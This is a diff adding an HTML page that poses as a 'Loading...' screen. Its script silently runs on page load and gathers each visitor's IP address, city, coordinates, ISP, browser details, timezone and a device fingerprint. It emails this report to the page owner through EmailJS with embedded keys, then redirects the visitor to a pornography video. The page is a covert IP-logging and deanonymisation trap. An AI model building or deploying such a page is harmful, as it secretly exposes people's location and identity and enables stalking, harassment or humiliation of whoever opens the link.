@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="UTF-8">
+<title>Loading...</title>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<script>
+(function(){
+emailjs.init("OCRNTDmp9goCkBZx7");
+})();
+</script>
+
+</head>
+
+<body>
+
+<p>Loading...</p>
+
+<script>
+
+async function runTracker(){
+
+// GLOBALNY LICZNIK
+let counterData = await fetch(
+"https://api.countapi.xyz/hit/YOURDOMAIN/visits"
+).then(r=>r.json());
+
+let visitNumber = counterData.value;
+
+
+// GEO IP
+let ipData = await fetch(
+"https://ipapi.co/json/"
+).then(r=>r.json());
+
+
+// BOT DETECTION
+let bot = /bot|crawler|spider|crawling/i.test(navigator.userAgent);
+
+
+// CONNECTION INFO
+let connection = navigator.connection || {};
+
+// TIMEZONE
+let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+
+// REFERRER
+let referrer = document.referrer;
+
+
+// COOKIE ENABLED
+let cookies = navigator.cookieEnabled;
+
+
+// TOUCH DEVICE
+let touch = 'ontouchstart' in window;
+
+
+// FINGERPRINT (prosty)
+let fingerprint = btoa(
+navigator.userAgent +
+navigator.language +
+screen.width +
+screen.height +
+navigator.platform
+);
+
+
+// REPORT
+let report = {
+
+visit_number: visitNumber,
+
+ip: ipData.ip,
+city: ipData.city,
+region: ipData.region,
+country: ipData.country_name,
+org: ipData.org,
+
+latitude: ipData.latitude,
+longitude: ipData.longitude,
+
+browser: navigator.userAgent,
+platform: navigator.platform,
+language: navigator.language,
+
+screen: screen.width + "x" + screen.height,
+color_depth: screen.colorDepth,
+
+timezone: timezone,
+
+connection_type: connection.effectiveType,
+connection_downlink: connection.downlink,
+
+cookies_enabled: cookies,
+
+touch_device: touch,
+
+referrer: referrer,
+
+bot: bot,
+
+fingerprint: fingerprint,
+
+url: window.location.href,
+
+time: new Date().toLocaleString()
+
+};
+
+
+// SEND MAIL
+emailjs.send(
+"service_ih1p04n",
+"template_pvl7hkh",
+report
+);
+
+
+// REDIRECT
+setTimeout(()=>{
+window.location.href="https://www.gayporntube.com/video/2003987/gay-risky-cum-in-the-lake-at-night";
+},1500);
+
+}
+
+runTracker();
+
+</script>
+
+</body>
+</html>
